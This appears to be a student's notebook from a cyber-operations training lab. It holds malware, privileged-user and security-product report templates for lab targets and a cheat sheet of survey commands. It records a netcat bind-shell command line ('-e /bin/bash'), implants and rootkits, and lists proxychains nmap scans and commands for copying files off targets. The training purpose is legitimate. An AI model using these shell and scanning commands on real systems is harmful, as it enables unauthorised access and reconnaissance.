/><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 6 and IP 192.168.117.106<br />Time:2021/05/04 - 11:41<br />Name:  nc<br />PID:  na<br />PPID:  na<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: listen on all ports 31337<br />Description: nc was tasked to listen on 31337 in the background. It is no longer running.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:e64c8abed7922d527786523a908215a2<br />File type of malware &amp; supporting files:elfx64<br />Associated logs:na<br />Location and lines of persistence: na <br />Malware file and support files full paths:/bin/nc<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 10 and IP 192.169.117.207<br />Time:2021/05/07 - 12:10<br />Name:  SPKL.exe<br />PID:  7144<br />PPID:  2432<br />User:  administrator<br />Location of config file:   na<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: SPKL is a keylogger by SPYRIX. SPKL kicks of spmm. SPKL appears to be an orphan process becasue it&#39;s parent no longer exists.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: 32 e1 a4 e5 62 03 3a 56 78 9a 77 de f6 0c 3c 98<br />File type of malware &amp; supporting files: pe<br />Associated logs: na (although there is a capability to remote log keystrokes there are no signs that this is the case here.)<br />Location and lines of persistence:  na<br />Malware file and support files full paths:&quot;C:\ProgramData\Security Monitor\{827D21CC-A22D-45D6-23CA-451DDAC769BA}\spkl.exe&quot; MD5<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 7 and IP 192.168.117.107<br />Time: sfk.exe<br />Name:  swiss file knife<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: na<br />Description: SFK is a file managment tool. It is not running ATM.<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: 0c fb c6 ae 15 2e 81 e6 57 ad 45 d0 21 f3 19 5f<br />File type of malware &amp; supporting files:pe<br />Associated logs:na<br />Location and lines of persistence:  hklm\software\microsoft\windows\currentversion\run<br />Malware file and support files full paths: C:\sfk.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 2 and IP 10.20.169.10<br />Time:2021/05/18 - 08:52<br />Name:  lf (LaunchOnFly<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description: Lf.exe is able to record keyboard and mouse input. It is not currently running.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 9b3916f441304b39c0d4e4477437294f<br />File type of malware &amp; supporting files: pe<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\lf.exe<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 5 and IP 192.169.117.201<br />Time: 2021/05/05 - 11:21<br />Name: tcpdump  <br />PID:  21503<br />PPID:  21483<br />User:  root<br />Location of config file:  na<br />Remote hostname or IP:  na<br />Network connections: none show in netstat but the network is likley being sniffed on the local  interface.<br />Description:The network is likley being sniffed on the local interface.<br /><br />### NSDB extras ###<br />Process options: -i lo -w /var/log/tcpdump.pcap<br />Hash:.1c66774b21053d19a12d01a87a1b9c9e<br />File type of malware &amp; supporting files:x64 elf<br />Associated logs:/var/log/tcpdump.pcap <br />Location and lines of persistence:  na<br />Malware file and support files full paths:na<br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 2 and IP 10.145.117.10<br />Time: 2021/05/06 - 08:59<br />Name: password.txt<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: C:\windows\system32<br />Remote hostname or IP: na <br />Network connections:na<br />Description: Txt file<br /><br />### NSDB extras ###<br />Process options:na<br />Hash: f089c0f820e4d17661e2c361490835cb<br />File type of malware &amp; supporting files: txt<br />Associated logs:na<br />Location and lines of persistence:na  <br />Malware file and support files full paths:C:\windows\system32<br />Identifiable text:na<br />Any modules loaded by malware:na <br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 7  and IP 192.186.169.144<br />Time: 2021/05/20 - 10:35<br />Name: script.ps1  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: C:\temp  <br />Remote hostname or IP:  https://git.cybbh.space/t10/public/-/raw/master/heat%2FNon_Standard_RepoOpenSSH-Win64.zip<br />Network connections: na<br />Description: Powershell script to Download\install openssh (and edit configs).<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 46 dd 9f e3 bf d4 ad 94 e9 bc 31 08 2a 9d ee 99<br />File type of malware &amp; supporting files: powershell<br />Associated logs:na<br />Location and lines of persistence: na  <br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />MALWARE<br />NEED Target, Name, Hash, PID, persistence/logs for MC report.<br /><br />*****Malware Report*****<br />Target: T# 9 and IP 192.169.117.206<br />Time: 2021/05/07 - 11:48<br />Name: svchost (nc)  <br />PID:  21566<br />PPID:  1<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  na<br />Network connections: listening on 31337<br />Description: VirusTotal matches the hash to nc. upon connection to this machine at 31337, a bash shell will be initiated.<br /><br />### NSDB extras ###<br />Process options: -nvlp 31337 -e /bin/bash<br />Hash:7a32c9739cc63ed983ae01af2577c01c<br />File type of malware &amp; supporting files: elfx64<br />Associated logs:na<br />Location and lines of persistence: na  <br />Identifiable text:na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T# 5 and IP 10.101.169.30<br />Time: 2021/05/11 - 11:22<br />Name: hMailServer.exe  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file:   c:\program files (x86)\hmailserver<br />Remote hostname or IP:  na<br />Network connections: na<br />Description: hmailserver.exe does not appear to be running. Not listening on any email ports.<br /><br />### NSDB extras ###<br />Process options: na<br />Hash: 0a7585129239412e4a7c16a7fec8b67a<br />File type of malware &amp; supporting files: c:\program files (x86)\hmailserver<br />Associated logs: c:\program files (x86)\hmailserver\Logs (non existant)<br />Location and lines of persistence:  na<br />Identifiable text: na<br />Any modules loaded by malware: na<br />Recommendation on what to do: CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#6 and IP 10.123.169.35<br />Time: 2021/05/11 - 12:32<br />Name: sendmail  <br />PID:  26539<br />PPID:  26535<br />User:  root<br />Location of config file: na  <br />Remote hostname or IP:  Listening on 25 (actually kicked owned by postfix)<br />Network connections: na<br />Description: sendmail running is not default and should never run as root.<br /><br />### NSDB extras ###<br />Process options: /usr/sbin/sendmail -FCronDaemon -i -odi -oem -oi -t -f root<br />Hash:dc50faaba9f6d6f0093e6151cf68598c<br />File type of malware &amp; supporting files: ELFx64<br />Associated logs: /var/log/maillog<br />Location and lines of persistence:  na (althought this process was kicked off by crond...)<br />Identifiable text: na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#5 and IP 192.168.169.111<br />Time: 2021/05/12 - 10:59<br />Name:  T10implant.exe<br />PID:  2816<br />PPID:   7812<br />User:  administrator<br />Location of config file:   C:\implant\T10implant.exe<br />Remote hostname or IP:  192.168.169.43<br />Network connections: Calls out to 192.168.169.43 on ports around 8000 <br />Description:Calls out to 192.168.169.43 on ports around 8000 and gives them code execution<br /><br />### NSDB extras ###<br />Process options:na<br />Hash:aed90e0732eb1ec90d8e5f9a7c2ff17d<br />File type of malware &amp; supporting files:pe<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T#5 and IP192.168.169.111<br />Time:2021/05/12 - 11:06<br />Name:  query<br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file:na  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:probably query.exe moved out of system32<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:fe82ab7377083bf03b81aded4cda9818<br />File type of malware &amp; supporting files:na<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na <br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br />*****Malware Report*****<br />Target: T# LP and IP 10.50.28.172<br />Time: 2021/05/13 - 08:55<br />Name: koadic  <br />PID:  na<br />PPID:  na<br />User:  na<br />Location of config file: /koadic  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description:koadic is a post exploitation toolkit.<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:c1244790a38f18ad37ff1b79fa6ac774<br />File type of malware &amp; supporting files:/koadic<br />Associated logs:na<br />Location and lines of persistence:na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />*****Malware Report*****<br />Target: T# 2 and IP  140.20.169.13<br />Time: 2021/05/17 - 09:15<br />Name:  dir<br />PID:  na<br />PPID:  na<br />User:  administrator<br />Location of config file: C:\windows\WIN.INTRUDER.DOSKEY<br />Remote hostname or IP:  na<br />Network connections:na<br />Description:Any time you run dir.exe the logged in user is logged to C:\users\%USERNAME%\IntruderLog.txt as well as C:\intruder.txt. dir.exe appears to be mapped to a script that echos &quot;HELLO INTRUDER.&quot; There is no dir in system 32 or in any other directory in the %path%. There is no remapping of the term &quot;dir&quot; with variables&quot;. I suspect that there may be some ADS things going on to hide the actual script being run. There appears to be a scheduled task (possibly on another machine) to delete (or pull) the combined logs in c:\.<br /><br />### NSDB extras ###<br />Process options:na <br />Hash:c71934ab993219e5dc4aac800a6f2784<br />File type of malware &amp; supporting files: C:\windows\WIN.INTRUDER.DOSKEY<br />Associated logs:C:\users\%USER%\IntruderLog.txt, C:\intruderlog.txt, <br />Location and lines of persistence:  na<br />Identifiable text: Hello Intruder!<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />Sample Log OUtput: Unauthorized Access Detected; Intrusion Logged and Threat Detection Team Notified of User:<br />fileserver\caisson14<br /> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME<br /> administrator         console             1  Active      none   5/17/2021 12:16 PM<br /> <br /><br />*****End of Report*****<br /><br /><br />*****Malware Report*****<br />Target: T#6 and IP 192.168.69.201<br />Time: 2021/05/20 - 10:09<br />Name:  brootkit<br />PID:  491  <br />PPID:  1<br />User:  root<br />Location of config file: /usr/include/.../*  <br />Remote hostname or IP:  na<br />Network connections:na<br />Description: BROOTKIT is a Lightweight rootkit implemented using bash shell scripts v0.10<br /><br />### NSDB extras ###<br />Process options: /bin/bash /usr/include/.../bashbd.sh (sleep 75)<br />Hash: <a href="https://github.com/cloudsec/brootkit">https://github.com/cloudsec/brootkit</a><br />File type of malware &amp; supporting files: .sh<br />Associated logs: na<br />Location and lines of persistence: na  <br />Identifiable text:na<br />Any modules loaded by malware:na<br />Recommendation on what to do:CM<br />*****End of Report*****</div><div class='page'><h1 class='title level-5'>Privileged User</h1><br/>PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:<br />IP:<br />Time:<br />Username:<br />Access Method:<br />Access Time:<br />Activity:<br />Network Connections:<br />Description:<br />Recommendation:<br />*****End of Report*****<br />REPORT WHAT THE USER IS DOING IN NOTES<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target: T7<br />IP: 192.186.169.144<br />Time: 2021/05/20 - 10:26<br />Username: administrator<br />Access Method:Console<br />Access Time: 5/10/2021 3:36 PM<br />Activity: cmd, Avira.Systray.exe (standby for report), notepad.<br />Network Connections: na<br />Description:administrator appears to be sitting at an open cmd prompt and is running an antivirus.<br />Recommendation:CM<br />*****End of Report*****<br /><br /><br />tasklist -v | findstr -i administrator <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />PRIVILEGED USER<br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target: T1<br />IP: 10.50.31.111<br />Time: 2021/05/20 - 11:51<br />Username: root<br />Access ss Time: 14:54<br />Activity: Bash<br />Running files/executables: na<br />Network Connections: <br />Description: The root user is logged in<br />Recommendation: CM<br />*****End of Report*****Method: tty <br />Access Time: 14:54<br />Activity: Bash<br />Running files/executables: na<br />Network Connections: <br />Description: The root user is logged in<br />Recommendation: CM<br />*****End of Report*****<br /><br /><br /><br /><br />****Privileged User Report****<br />REPORT IN OPNOTES<br />Target: T5<br />IP: 10.20.169.111<br />Time: 2021/05/12 - 10:21<br />Username: administrator<br />Access Method:console<br />Access Time: 2021/05/12 - 10:34<br />Activity: edge, T10implant.exe, powershell, msascuil.exe (winDefend interface), mmc, eventviewer, OLEMainThreadWndName, cmd, skype, RDP into 192.168.169.12 as user17.<br />Network Connections: na<br />Description:administrator appears to be consoled in and surfing the web aswell as periodically running C:\implant\T10implant.exe. RDP into 192.168.169.12 as user17.<br />Recommendation:CM<br />****End of Report****<br /><br /><br /><br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:lp<br />IP:10.50.27.67<br />Time:2021/05/13 - 08:38<br />Username:root<br />Access Method:tty<br />Access Time:11:50<br />Activity: none<br />Network Connections:na<br />Description:root is consoled in<br />Recommendation:CM<br />*****End of Report*****<br />REPORT WHAT THE USER IS DOING IN NOTES<br /><br /><br /><br /><br /><br />*****Privileged User Report*****<br />REPORT IN OPNOTES<br />Target:5<br />IP:192.186.169.201<br />Time:2021/05/20 - 09:38<br />Username:radicle<br />Access Method:tty1<br />Access Time:12:08<br />Activity: bash shell<br />Network Connections: na<br />Description:radicle may be a user that is logged in via tty sitting on a bash shell.<br />Recommendation:CM<br />*****End of Report*****</div><div class='page'><h1 class='title level-5'>Security Products</h1><br/>SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# and IP<br />Time: <br />Name:  <br />Version:  <br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of all associated log files:<br />SeMode: <br />Cloud based?  : <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T#8 and IP 192.186.169.142<br />Time: 2021/05/20 - 10:54<br />Name:  SELinux<br />Version:  31<br />Primary registry key / Config &amp; Installation location on *nix: /etc/selinux<br /><br />### NSDB extras ###<br />Installation folder:  /sys/fs/selinux<br />Location of logs: /var/<strong>log</strong>/audit/audit.log or /var/log/messages (/var/log/messages in this case)<br />SeMode: Permissive<br />Cloud based?  Y or N: NO<br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[askar14@DESKTOP-USER24 ~]$ sudo ls -lah /var/log/messages &amp;&amp; sudo tail -n 5 /var/log/messages<br />-rw-------. 1 root root 1008K May 20 14:54 /var/log/messages<br />May 20 14:54:36 DESKTOP-USER24 audit[11735]: ADD_USER pid=11735 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=add-user id=1037 exe=&quot;/usr/sbin/useradd&quot; hostname=DESKTOP-USER24 addr=? terminal=pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11740]: USER_MGMT pid=11740 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=pam_tally2 reset=0 id=1037 exe=&quot;/usr/sbin/pam_tally2&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11735]: USER_MGMT pid=11735 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=add-home-dir id=1037 exe=&quot;/usr/sbin/useradd&quot; hostname=DESKTOP-USER24 addr=? terminal=pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11733]: USER_END pid=11733 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:session_close grantors=pam_keyinit,pam_limits,pam_keyinit,pam_limits,pam_systemd,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />May 20 14:54:37 DESKTOP-USER24 audit[11733]: CRED_DISP pid=11733 uid=0 auid=1005 ses=47 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg=&#39;op=PAM:setcred grantors=pam_env,pam_localuser,pam_unix acct=&quot;root&quot; exe=&quot;/usr/bin/sudo&quot; hostname=? addr=? terminal=/dev/pts/0 res=success&#39;<br />*****End of Report*****<br /><br /><br />sudo ls -lah /var/log/messages &amp;&amp; sudo tail -n 5 /var/log/messages<br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 4and IP 192.168.169.43<br />Time: 2021/05/12 - 09:36<br />Name:  clamav<br />sudo clamscan --version<br />Version:   0.103.2/26166<br />Primary registry key / Config &amp; Installation location on *nix: /etc/clamd.d/scan.conf<br /><br />### NSDB extras ###<br />Installation folder:  /usr/share/clamav/freshclam-sleep<br />Location of logs: /var/log/clamav_daily<br />Timestamp of all associated log files: May  12 05:06<br />SeMode: na<br />Cloud based?  :no  <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[user14@desktop-admin1 ~]$ sudo ls -lah /var/log/clamav_daily &amp;&amp; sudo tail -n 5 /var/log/clamav_daily <br />-rw-r--r--. 1 root root 608 May 12 05:06 /var/log/clamav_daily<br />Data scanned: 4434.68 MB<br />Data read: 2289.65 MB (ratio 1.94:1)<br />Time: 362.730 sec (6 m 2 s)<br />Start Date: 2021:05:12 05:00:01<br />End Date:   2021:05:12 05:06:03<br />Recommendation on what to do:CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 4 and IP 192.168.169.43<br />Time: 2021/05/12 - 09:33<br />Name:  lynis<br />lynis --version<br />Version:  3.0.1 (/bin/lynis)<br />Primary registry key / Config &amp; Installation location on *nix:/etc/lynis/default.prf<br /><br />### NSDB extras ###<br />Installation folder:  /bin/lynis<br />Location of logs: /var/<strong>log</strong>/<strong>lynis</strong>.<strong>log</strong><br />Timestamp of all associated log files:May  12 13:00<br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[user14@desktop-admin1 ~]$ sudo ls -lah /var/log/lynis.log &amp;&amp; sudo head -n 5 /var/log/lynis.log<br />-rw-r-----. 1 root root 274K May 12 13:00 /var/log/lynis.log<br />2021-05-12 13:00:01 Starting Lynis 3.0.1 with PID 4763, build date 2020-10-05<br />2021-05-12 13:00:01 ====<br />2021-05-12 13:00:01 ### 2007-2020, CISOfy - <a href="https://cisofy.com/lynis/">https://cisofy.com/lynis/</a> ###<br />2021-05-12 13:00:01 Checking permissions of /usr/share/lynis/include/profiles<br />2021-05-12 13:00:01 File permissions are OK<br />Recommendation on what to do:  CM<br />*****End of Report*****<br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 6 and IP 129.168.117.54<br />Time: 2021/05/05 - 12:10<br />Name:  linux-malware-detect<br />Version:  1.6.5<br />Primary registry key / Config &amp; Installation location on *nix:/usr/local/maldetect/conf.maldet<br /><br />### NSDB extras ###<br />Installation folder:  /root/linux-malware-detect<br />Location of logs: /root/linux-malware-detect/<br />Timestamp of all associated log files:May  5 11:53 <br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />[student14@dryruns-targeta-admin ~]$ sudo tail -n 5 /root/linux-malware-detect/report.txt<br />maldet(13141): {scan} scan of / (51 files) in progress...<br />maldet(13141): {scan} 51/51 files scanned: 0 hits 0 cleaned<br /><br />maldet(13141): {scan} scan completed on /: files 51, malware hits 0, cleaned hits 0, time 2s<br />maldet(13141): {scan} scan report saved, to view run: maldet --report 210505-1153.13141<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 7 and IP 192.186.169..203<br />Time: 2021/05/18 - 11:07<br />Name:  kasperski<br />Version:  Kaspersky Free 20.0<br />Primary registry key / Config &amp; Installation location on *nix:HKEY_LOCAL_MACHINE\software\KasperskyLab<br /><br />### NSDB extras ###<br />Installation folder:  C:\Program Files (x86)\Kaspersky Lab\<br />Location of logs: C:\Program Files (x86)\Kaspersky Lab\logs (does not exist, may not be logging)<br />Timestamp of all associated log files: na<br />SeMode: na<br />Cloud based? : If Security Cloud was running, yes, but in this case no. <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?na<br />Recommendation on what to do: It appears that only the kaspersky VPN is running and that the AV is not logging. Reccomend CM.  <br />*****End of Report*****<br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 8 and IP 192.169.117.205<br />Time: 2021/05/07 - 11:17<br />Name:  bitdefender<br />Version:  1.0.21.234  (reg query hklm\software\bitdefender)<br />Primary registry key / Config &amp; Installation location on *nix: hklm\software\bitdefender<br /><br />### NSDB extras ###<br />Installation folder:  C:\program files\bitdefender agent<br />Location of logs: na<br />Timestamp of all associated log files: na<br />SeMode: na<br />Cloud based? :  no<br />&gt;&gt;If yes, last 5 lines of logs: na<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 7 and IP 192.186.169.144<br />Time: 2021/05/20 - 10:28<br />Name:  avira<br />Version:  15.0.2104.2089      type &quot;C:\program files (x86)\Avira\launcher\securityproductinformation.ini&quot;<br />Primary registry key / Config &amp; Installation location on *nix: &quot;HKEY_LOCAL_MACHINE\Software\Wow6432Node\Avira&quot;<br /><br />### NSDB extras ###<br />Installation folder:  &quot;C:\program files (x86)\Avira\launcher&quot;<br />Location of logs: &quot;C:\program files (x86)\Avira\Antivirus\LOGFILES&quot; (does not exist)<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?: NO <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# 5 and IP 10.180.169.20<br />Time: 2021/05/13 - 12:13<br />Name:  Malicous software removal tool<br />Version:  5.89<br />Primary registry key / Config &amp; Installation location on *nix:HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\MRT<br /><br />### NSDB extras ###<br />Installation folder:  c:\windows\system32\MRT<br />Location of logs:na<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :no <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  CM<br />*****End of Report*****<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# lp  and IP 10.50.28.172<br />Time: 2021/05/13 - 12:36<br />Name: watchdog  <br />Version:  na<br />Primary registry key / Config &amp; Installation location on *nix:/etc/watchdog.conf<br /><br />### NSDB extras ###<br />Installation folder:  /bin/watch<br />Location of logs:na<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :na <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do:  CM (Watchdog is not configured and not doing anything).<br />*****End of Report*****<br /><br /><br /><br /><br /><br />SECURITY PRODUCT<br />NEED Target and Name minimum to report to MC.<br /><br />*****Security Product Report*****<br />Target:  T# 5 and IP 10.101.169.30<br />Time: 2021/05/17 - 11:33<br />Name:  comodo<br />Version:  2.3<br />Primary registry key / Config &amp; Installation location on *nix: HKEY_LOCAL_MACHINE\software\COMODO\<br /><br />### NSDB extras ###<br />Installation folder:  c:\comodo.exe<br />Location of logs: na (if it would run, it would log to the current dir unless specified otherwise).<br />Timestamp of all associated log files:na<br />SeMode: na<br />Cloud based?  :na <br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM  <br />*****End of Report*****<br /><br /><br /><br /><br /><br />*****Security Product Report*****<br />Target:  T# 6 and IP 192.186.169.134<br />Time: 2021/05/20 - 10:12<br />Name:  rkhunter<br />Version:  1.4.6<br />Primary registry key / Config &amp; Installation location on *nix:<br /><br />### NSDB extras ###<br />Installation folder:  <br />Location of logs:<br />Timestamp of all associated log files:/etc/default/rkhunter<br />SeMode: na<br />Cloud based?  : na<br />&gt;&gt;If yes, last 5 lines of logs:<br />&gt;&gt;If no, why?<br />Recommendation on what to do: CM <br />*****End of Report*****</div><div class='page'><h1 class='title level-5'>OpNotes</h1><br/>II.  Op Notes<br /><br />1.  Mission start / end time<br />2.  Connect / Disconnect Time for each Target<br />3.  Start and end timestamps of &quot;Upon Connection&quot; and &quot;Before Disconnect&quot; vetting command sections<br />4.  Full output of vetting commands is not required<br /><br />III.  Collection reports to Analyst<br /><br />1.  Completion of all analyst tasks (survey, collect, scanning)<br />2.  Hash all collected files on target and ops station.<br />3.  Survey Notes<br />    • Start and end timestamps of &quot;Analyst Survey Commands&quot;<br />    • Students will create a seperate file for every device they survey with the full output of the survey commands. Naming convention will be &quot;Survey_&lt;IP_Address&gt;&quot;.<br /><br />IV.  Post-op<br /><br />1.  All files go into OPSDIR.<br />2.  Submit DEBRIEF to MC.<br />      – Description plus ADMIN USER REPORT plus one sentence per target<br />3.  tar -cvf OPSDIR.tar OPSDIR/<br />4.  scp OPSDIR.tar student3@10.50.24.17:~</div><div class='page'><h1 class='title level-4'>SA</h1><br/>• --Check selinux logs<br />sudo stat /var/log/audit/audit.log<br />sudo cat /var/log/audit/audit.log |tail<br /><br />--NMAP scan remote target(s)<br />proxychains nmap -sT -Pn -T3 -v -p &lt;port(s)&gt; 192.168.0.0/24<br /><br />--Banner grab via netcat<br />proxychains nc -nv 192.168.0.x &lt;port&gt;<br /><br />--Display Windows Logs<br />wevtutil qe &lt;System/Security/Application&gt; /c:20 /f:text<br /><br />--WIN software enumeration<br />reg query hklm\software<br /><br />--WIN software locations<br />HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall<br />##HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall &lt;alt of above&gt;<br />HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall<br />HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall<br /><br />--Windows Defender version info<br />reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Signature Updates&quot;<br /><br />--SCP with spaces in path<br />scp -vvv -o ControlPath=/tmp/T5 -P 5005 -r student5@127.1:&#39;&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; ~/McCoy/Desktop/<br /><br />--Shortened windows path (SCP)<br />c:\PROGRA~1\COMMON~1\system\ado<br /><br />--Find hash in WINDOWS<br />certutil -hashfile &quot;file.png&quot; MD5<br />powershell, get-filehash -algorithm -path... -recurse<br /><br />--Generate hashes for multiple files in directory<br />for %F in (*) do @certutil -hashfile &quot;%F&quot; MD5<br /><br />--Find total file size in directory (LINUX)<br />du -ch /directory<br /><br />--Find total file size in directory (WIN)<br />dir /a /s  <br /><br />--Find PPID in windows<br />wmic process list full<br /><br />--WMIC - verify winmgmt is running prior to using <br />sc query winmgmt<br /><br />--Process info<br />wmic process where processid=&lt;PID&gt; get processid, parentprocessid, executablepath<br /><br />--Check if IPTABLES enabled<br />cat /proc/sys/net/ipv4/ip_forward (1 = enabled)<br /><br 